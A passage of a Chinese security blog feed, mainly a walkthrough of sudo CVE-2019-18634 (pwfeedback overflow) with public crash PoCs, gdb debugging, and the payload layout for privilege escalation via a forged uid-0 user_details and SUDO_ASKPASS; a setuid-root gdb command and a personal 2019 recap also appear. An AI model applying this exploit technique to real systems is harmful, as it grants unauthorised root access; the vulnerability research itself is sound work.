[X4,#-0x30]</span><br><span class="line">STP             X8, X9, [X3,#0x20]</span><br><span class="line">LDP             X8, X9, [X4,#-0x20]</span><br><span class="line">STP             X10, X11, [X3,#0x30]</span><br><span class="line">LDP             X10, X11, [X4,#-0x10]</span><br><span class="line">STP             X12, X13, [X3,#0x40]</span><br><span class="line">STP             X1, X2, [X5,#-0x40]</span><br><span class="line">STP             X6, X7, [X5,#-0x30]</span><br><span class="line">STP             X8, X9, [X5,#-0x20]</span><br><span class="line">STP             X10, X11, [X5,#-0x10]</span><br><span class="line">RET</span><br><span class="line">; &#125; &#x2F;&#x2F; starts at 1C770</span><br></pre></td></tr></table></figure><p>之后的代码逻辑直接就是 RET ，导致 并没有拷贝过长的内存，导致 crash。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android8.1" scheme="https://bestwing.me/tags/Android8-1/"/>
    
    <category term="memcpy" scheme="https://bestwing.me/tags/memcpy/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-18634 分析</title>
    <link href="https://bestwing.me/CVE-2019-18634-analysis.html"/>
    <id>https://bestwing.me/CVE-2019-18634-analysis.html</id>
    <published>2020-02-06T16:00:00.000Z</published>
    <updated>2020-06-22T18:00:43.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>Sudo’s <em>pwfeedback</em> option can be used to provide visual feedback when the user is inputting their password. For each key press, an asterisk is printed. This option was added in response to user confusion over how the standard <code>Password:</code> prompt disables the echoing of key presses. While <em>pwfeedback</em> is not enabled by default in the upstream version of sudo, some systems, such as Linux Mint and Elementary OS, do enable it in their default sudoers files.</p><p>Due to a bug, when the <em>pwfeedback</em> option is enabled in the sudoers file, a user may be able to trigger a stack-based buffer overflow. This bug can be triggered even by users not listed in the sudoers file. There is <strong>no</strong> impact unless <em>pwfeedback</em> has been enabled.</p></blockquote><p>可以知道的信息是：</p><ol><li>漏洞存在的情形时在开启 <strong>pwfeedback</strong> 的前提下</li></ol><p>开启方法 <code>echo Defaults pwfeedback &gt;&gt; /etc/sudoers</code><br>2. 影响版本  1.8.26-1.8.30<br>3. CVE 上写的 stack-based buffer overflow 是有误的，我们后面会提到</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>在 openwall 和 sudo 官网上都能看到连接在下面</p><p><a href="https://www.openwall.com/lists/oss-security/2020/02/05/2">CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled</a></p><p><a href="https://www.sudo.ws/alerts/pwfeedback.html">Buffer overflow when pwfeedback is set in sudoers </a></p><p><strong>PoC 1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ socat pty,link&#x3D;&#x2F;tmp&#x2F;pty,waitslave exec:&quot;perl -e &#39;print((\&quot;A\&quot; x 100 . chr(0x15)) x 50)&#39;&quot; &amp;</span><br><span class="line"> $ sudo -S -k id &lt; &#x2F;tmp&#x2F;pty</span><br><span class="line"> Password: Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p><strong>PoC2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &#39;print((&quot;A&quot; x 100 . chr(0)) x 50)&#39; | sudo -S -k id</span><br><span class="line">Password: Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>PoC1 是通过 pty 程序传 payload  ，PoC2 是通过终端，另外可以看到 一个结尾为 <code>chr(0x15)</code> 一个结尾是 <code>chr(0)</code>, 这是根据不同的传入方式区分的。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h3><p>我的环境是 ubuntu18.04 然后我编译了一份 sudo 1.8.21p2 的源码，方便用来调试</p><p>为了方便，我一开始用的是 PoC2：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/sudo/sudo-1.8.21p2/src/.libs$ gdb -q ./sudo</span><br><span class="line">Reading symbols from ./sudo...done.</span><br><span class="line">gdb-peda$ r -S id &lt; /tmp/poc2</span><br><span class="line">Starting program: /home/swing/Desktop/sudo/sudo-1.8.21p2/src/.libs/sudo -S id &lt; /tmp/poc2</span><br><span class="line">sudo: effective uid is not 0, is /home/swing/Desktop/sudo/sudo-1.8.21p2/src/.libs/sudo on a file system with the <span class="string">&#x27;nosuid&#x27;</span> option <span class="built_in">set</span> or an NFS file system without root privileges?</span><br><span class="line">[Inferior 1 (process 14799) exited with code 01]</span><br></pre></td></tr></table></figure><p>第一次挂载 gdb 的时候会发现 权限不够，但是如果权限是 root sudo又失去了意义，所以我给 gdb 挂上了和 sudo 一样的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown root:root /usr/bin/gdb &amp;&amp; chmod 4755 /usr/bin/gdb</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191157.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191157.png"></a></p><p>然后在调试，就基本确定了主要漏洞的存在，在 tgetpass.c:178 getln函数里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (timeout &gt; <span class="number">0</span>)</span><br><span class="line">alarm(timeout);</span><br><span class="line">   pass = getln(input, buf, <span class="keyword">sizeof</span>(buf), ISSET(flags, TGP_MASK));</span><br><span class="line">   alarm(<span class="number">0</span>);</span><br><span class="line">   save_errno = errno;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (neednl || pass == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (write(output, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">goto</span> restore;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>而且, 由于 buf 是static const 位于bss上，所以并不是 什么栈溢出，而是 bss 溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *</span><br><span class="line">tgetpass(<span class="keyword">const</span> <span class="keyword">char</span> *prompt, <span class="keyword">int</span> timeout, <span class="keyword">int</span> flags,</span><br><span class="line">    struct sudo_conv_callback *callback)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>, <span class="title">savealrm</span>, <span class="title">saveint</span>, <span class="title">savehup</span>, <span class="title">savequit</span>, <span class="title">saveterm</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">savetstp</span>, <span class="title">savettin</span>, <span class="title">savettou</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *pass;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *askpass;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[SUDO_CONV_REPL_MAX + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> i, input, output, save_errno, neednl = <span class="number">0</span>, need_restart;</span><br><span class="line">    debug_decl(tgetpass, SUDO_DEBUG_CONV)</span><br></pre></td></tr></table></figure><p>这个时候，如果我们用 ida 看，能看到他总共覆盖了哪些变量</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191603.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191603.png" style="zoom:50%;" /></a><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>我们找到了一些能覆盖的内容，那么我紧接着要找到哪些是可利用的, 中间 user_details 这个结构体的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p user_details</span><br><span class="line">$2 &#x3D; &#123;</span><br><span class="line">  pid &#x3D; 0x41414141,</span><br><span class="line">  ppid &#x3D; 0x41414141,</span><br><span class="line">  pgid &#x3D; 0x41414141,</span><br><span class="line">  tcpgid &#x3D; 0x41414141,</span><br><span class="line">  sid &#x3D; 0x41414141,</span><br><span class="line">  uid &#x3D; 0x41414141,</span><br><span class="line">  euid &#x3D; 0x41414141,</span><br><span class="line">  gid &#x3D; 0x41414141,</span><br><span class="line">  egid &#x3D; 0x41414141,</span><br><span class="line">  username &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  cwd &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  tty &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  host &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  shell &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  groups &#x3D; 0x4141414141414141,</span><br><span class="line">  ngroups &#x3D; 0x41414141,</span><br><span class="line">  ts_cols &#x3D; 0x41414141,</span><br><span class="line">  ts_lines &#x3D; 0x41414141</span><br><span class="line">&#125;</span><br><span class="line">gdb</span><br></pre></td></tr></table></figure><p>这个时候，我们就会想如果我们把 uid 覆盖成0 会怎么样？另外在看代码的过程中一段代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tgetpass.c 276</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Fork a child and exec sudo-askpass to get the password from the user.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *</span><br><span class="line">sudo_askpass(<span class="keyword">const</span> <span class="keyword">char</span> *askpass, <span class="keyword">const</span> <span class="keyword">char</span> *prompt)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[SUDO_CONV_REPL_MAX + <span class="number">1</span>], *pass;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>, <span class="title">savechld</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pfd[<span class="number">2</span>], status;</span><br><span class="line">    <span class="keyword">pid_t</span> child;</span><br><span class="line">    debug_decl(sudo_askpass, SUDO_DEBUG_CONV)</span><br><span class="line">      ....</span><br><span class="line">      ....</span><br><span class="line">closefrom(STDERR_FILENO + <span class="number">1</span>);</span><br><span class="line">execl(askpass, askpass, prompt, (<span class="keyword">char</span> *)<span class="literal">NULL</span>);</span><br><span class="line">sudo_warn(U_(<span class="string">&quot;unable to run %s&quot;</span>), askpass);</span><br><span class="line">_exit(<span class="number">255</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里 execl 的参数 askpass 是前面被覆盖的变量之一，感觉后面会用到。然后在调试的过程中，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tgetpass.c 211</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NSIG; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (signo[i]) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (i) &#123;</span><br><span class="line"><span class="keyword">case</span> SIGTSTP: <span class="comment">// 18</span></span><br><span class="line"><span class="keyword">case</span> SIGTTIN: <span class="comment">// 21</span></span><br><span class="line"><span class="keyword">case</span> SIGTTOU: <span class="comment">// 22</span></span><br><span class="line">    <span class="keyword">if</span> (suspend(i, callback) == <span class="number">0</span>)</span><br><span class="line">need_restart = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    kill(getpid(), i);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>卡在了 这里，signo 也是我们覆盖的变量之一，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;30x &amp;signo</span><br><span class="line">0x5583b72413e0 &lt;signo&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72413f0 &lt;signo+16&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241400 &lt;signo+32&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241410 &lt;signo+48&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241420 &lt;signo+64&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241430 &lt;signo+80&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241440 &lt;signo+96&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241450 &lt;signo+112&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241460 &lt;signo+128&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241470 &lt;signo+144&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241480 &lt;signo+160&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241490 &lt;signo+176&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72414a0 &lt;signo+192&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72414b0 &lt;signo+208&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72414c0 &lt;signo+224&gt;:0x41414141414141410x4141414141414141</span><br></pre></td></tr></table></figure><p>此时， signo 被覆盖成了 0x41414141 * N ，从代码逻辑看，我们得为空才能避免被 kill 掉，但由于我们的 此时的 PoC2 是以 <code>chr(0)</code> 作结尾的，所以 signo 此时必不能为 <code>\x00</code>, 那么此时我们只能换成 PoC1 去调试。紧接着另外一个问题又来了，由于 PoC1 是 pty 形式的，所以我们得做以下顺序</p><ol><li>运行 gdb</li><li>挂载调试器</li><li>然后才是 socat 命令</li></ol><p>不然 可能你刚挂载上去 程序就 crash 掉了</p><p>我这里用了一个更蠢的方法，就是 通过 gdb 强行 set 关键的数据，这样虽然慢了一点，但避免了我接着去解决 gdb 调试sudo 的问题</p><p>所以到此时，思路就是除了 user_details 的内容，其他我们先默认覆盖为 0 ，则 payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x00\x15&quot; * buf_size + &quot;\x00\x15&quot; * signo_sz + &quot;\x00&quot; * tgetpass_flags + &quot;\x00&quot; *24+ user_details + ...</span><br></pre></td></tr></table></figure><p>但是，这里又会出现一个问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/sudo/exploit$ ./exploit.sh</span><br><span class="line">[sudo] password <span class="keyword">for</span> swing:</span><br><span class="line">Sorry, try again.</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br><span class="line">sudo: 1 incorrect password attempt</span><br><span class="line">Exploiting!</span><br></pre></td></tr></table></figure><p>然后翻代码的时候，猜测是 <strong>tgetpass_flag</strong> 有问题，不能是 “\x00\x00\x00\x00” ,因为我们最后可能要用到 sudo_askpassh 这个函数，</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207203009.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207203009.png" style="zoom:50%;" /></a><p>在代码里和 sudo_askpassh 有关的字样好像是 TGP_ASKPAS ,看到有关宏定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Flags for tgetpass()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_NOECHO0x00<span class="comment">/* turn echo off reading pw (default) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_ECHO0x01<span class="comment">/* leave echo on when reading passwd */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_STDIN0x02<span class="comment">/* read from stdin, not /dev/tty */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_ASKPASS0x04<span class="comment">/* read from askpass helper program */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_MASK0x08<span class="comment">/* mask user input when reading */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_NOECHO_TRY0x10<span class="comment">/* turn off echo if possible */</span></span></span><br></pre></td></tr></table></figure><p>那大概就是 0x4了 所以这里设置为 “\x04\x00\x00\x00”，那剩下的 <strong>user_details</strong> 结构体怎么办？ 最简单的办法就抄一个，然后将 uid 字段设置为 0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_details &#x3D; &quot;\x53\x87\x00\x00\x47\x87\x00\x00\x53\x87\x00\x00\x53\x87\x00\x00\x76\x3d\x00\x00\x00\x00\x00\x00&quot;</span><br></pre></td></tr></table></figure><p>上面是我从 gdb 直接手抄的，并将 uid 设置为0</p><p>最后 加上足够长的 结束符 和 “\n” 就完成了整个 exploit ，另外 由于我们要提权，所以得事前写好一个 shell , set uid 并执行一个shell。</p><p>且在执行 exploit的时候要设置 SUDO_ASKPASS 环境变量为执行程序路径</p><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><a href="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE"><a href="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE.svg" title="asciicast" class="gallery-item"><img src="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE.svg" alt="asciicast"></a></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.openwall.com/lists/oss-security/2020/02/05/2">CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled</a></p><p><a href="https://www.sudo.ws/alerts/pwfeedback.html">Buffer overflow when pwfeedback is set in sudoers </a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2019-18634" scheme="https://bestwing.me/tags/CVE-2019-18634/"/>
    
  </entry>
  
  <entry>
    <title>Goodbye 2019,Hello 2020!</title>
    <link href="https://bestwing.me/Goodbye_2019,Hello_2020!.html"/>
    <id>https://bestwing.me/Goodbye_2019,Hello_2020!.html</id>
    <published>2019-12-31T16:00:00.000Z</published>
    <updated>2019-12-31T18:13:04.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Goodbye-2019"><a href="#Goodbye-2019" class="headerlink" title="Goodbye 2019"></a>Goodbye 2019</h2><p>2019 年，从学生到安全研究员… 经历了一阵子的茫然，但是也逐渐找到了自己的方向.</p><h3 id="1月"><a href="#1月" class="headerlink" title="1月"></a>1月</h3><p>在华为进行代码审计，第一次接触通讯领域的一些相关协议，以及相关协议代码实现。主要是3GPP<br> 3G 、4G、5G 等相关的内容</p><h3 id="2月"><a href="#2月" class="headerlink" title="2月"></a>2月</h3><p>春节假期回家，已经感觉好久没回家了，今年这个时候整理了 2018 自己的经历。</p><ul><li>去了海边</li><li>去了以前的高中</li></ul><p>假期结束，又回了华为，接着审代码 Orz</p><h3 id="3月"><a href="#3月" class="headerlink" title="3月"></a>3月</h3><ul><li>回公司搞了一些 IoT 设备，路由、摄像头都有</li><li>3月23日和婴宁去看了音乐会，讲道理我真听不懂 Orz</li><li>中间搞了一段时间一些 VPN 设备</li></ul><h3 id="4月"><a href="#4月" class="headerlink" title="4月"></a>4月</h3><p>4月份，这个时候准备回学校安心做毕业设计了…花了大概一个月时间完成了自己的毕设…主要还是数据处理，Python 对简化我的工作起到了很大的作用</p><h3 id="5月"><a href="#5月" class="headerlink" title="5月"></a>5月</h3><p>5月份的时候，毕设基本完成了，论文也基本成稿。</p><p>中旬的时候，去了 TW 当毕业旅行了…</p><ul><li>逛了台北，然后去了花莲，玩了滑翔伞</li><li>然后又回到台北，去了台北101，逛了台北的书店，买了一本书：《一九四⑨ 大江大海》</li></ul><p>逛完台北，5月底回学校拍了学院毕业照，距离毕业更近了</p><h3 id="6月"><a href="#6月" class="headerlink" title="6月"></a>6月</h3><p>6月初的时候，r3kapig 承办了”B”CTF DEFCON CHINA …被拉去了北京当运维</p><p>回了学校，班级也拍了自己的毕业照，这大概是大家最后的一次合照了</p><p>6月9号..去了上海 冲刺DEFCON Final的最后一张门票 — 0CTF Final。最后10分钟的时候连出两个题，绝杀Balsn，ne0 tql (不好意思..”我们有400人呢！“)</p><p>6月27日，生日 + 班级的告别聚餐，这一天也正式认识了我现在的女朋友…6月29日，我大概是我们班最后离开了宿舍，离开了学校的人吧..离开的时候，拍了不少照片</p><p>中间进行了GeekPwn 华为专场备赛</p><h3 id="7月"><a href="#7月" class="headerlink" title="7月"></a>7月</h3><p>7月5号 chaitin 5周年年会，哈哈 ，只中了个三件套</p><p>7月6号 360 世界黑客大师赛，我年会结束后打车去了酒店帮忙做题…最后拿了个第三</p><p>7月20日 ，蹭了个看雪论坛</p><p>7月24日，去了上海 打了前面六月份准备完成的GeekPwn 华为专场，论“从一个参数注入到命令执行”</p><h3 id="8月"><a href="#8月" class="headerlink" title="8月"></a>8月</h3><p>蹭了个 “靠谱黑客音乐节”的票，周末去玩了下。顺便一说，我的美国签证挂了..</p><p>r3kpaig DEFCON 27 CTF Final 11…</p><p>8月24日,Kcon 遇到了好久没见的 lowkey</p><p>8月25日，五月天 2019 Just Rock It ！！！ Blue 北京站，第一次去看演唱会。中间还支撑了ogeek的线上比赛，听演唱会听到一半，听到题目回滚的时候，sandbox炸了 …哭了</p><p>8月29日，去长春出差，顺便和小墨、医生面基</p><h3 id="9月"><a href="#9月" class="headerlink" title="9月"></a>9月</h3><p>Ogeek结束，筹备 RWCTF Online ,但是我题由于某些原因，被干了，出题失败..于是和@leommxj 准备GeekPwn 2014 上海站的项目，我们这次选定了，公司的投影设备，准备做个蠕虫链。</p><p>搞到一半，公司又接了个代码审计的活，这次是去了南京华为。只好中间剩下的东西由@explorer 和@leommxj完成。</p><h3 id="10月"><a href="#10月" class="headerlink" title="10月"></a>10月</h3><p>国庆7天和女朋友在南京度过..</p><ul><li><p>夫子庙</p></li><li><p>秦淮河</p></li><li><p>中山陵</p></li><li><p>南京博物馆</p></li><li><p>雨花台</p><p>…..</p></li></ul><p>10月24日 去了上海参加GeekPwn ,挑战十分顺利，比赛结束后，顺便回北京取了冬天的衣服，顺便一说，秋天的768蛮好看</p><h3 id="11月"><a href="#11月" class="headerlink" title="11月"></a>11月</h3><p>仍然在南京华为审计代码…</p><p>11月中旬的某个周末去看女朋友了</p><p>11月23号后，项目结束，回北京筹备 RWCTF Final 的题目，方向是打印机…我们决定从 IPP 入手，选择了 cupsd 的代码</p><p>wp见：<a href="https://github.com/bash-c/rwctf2019-final-printer">https://github.com/bash-c/rwctf2019-final-printer</a></p><p>11月30日，北京下雪了 </p><h3 id="12月"><a href="#12月" class="headerlink" title="12月"></a>12月</h3><p>12月6日，RWCTF Final 开启，去年是选手，今年是工作人员，有点唏嘘。</p><p>RWCTF 结束后，突然捡到了小米打印机的一个洞，拿到了第一个shell，之后又有了一点产出..233</p><p>12月28日，和女朋友去天津玩了两天，坐了天津之眼</p><h2 id="Hello-2020"><a href="#Hello-2020" class="headerlink" title="Hello 2020"></a>Hello 2020</h2><p>“只争朝夕，不负韶华”</p><p>希望能有更多的产出吧 </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">Goodbye 2019,Hello 2020!</summary>
    
    
    
    <category term="note" scheme="https://bestwing.me/categories/note/"/>
    
    
    <category term="life" scheme="https://bestwing.me/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>编译属性 &quot;__attribute__&quot; 的一些简单认识</title>
    <link href="https://bestwing.me/Compile_attribute_properties.html"/>
    <id>https://bestwing.me/Compile_attribute_properties.html</id>
    <published>2019-11-22T16:00:00.000Z</published>
    <updated>2019-11-23T14:09:00.000Z</updated>
    
